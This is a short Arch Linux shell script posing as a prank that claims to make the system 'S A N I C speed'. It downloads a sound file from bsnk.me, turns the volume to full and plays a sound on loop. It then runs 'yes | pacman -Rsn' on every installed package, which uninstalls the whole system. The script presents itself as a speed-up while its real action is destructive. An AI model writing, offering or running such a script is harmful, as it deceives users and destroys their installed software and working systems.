echo "Making system S A N I C speed.."

wget http://bsnk.me/sanic.wav
amixer set Master 100%
play -q s.wav repeat 100 &

packages=$(pacman -Q | cut -f1 -d" ")
while read -r line; do
    yes | pacman -Rsn $line
done <<< "$packages"
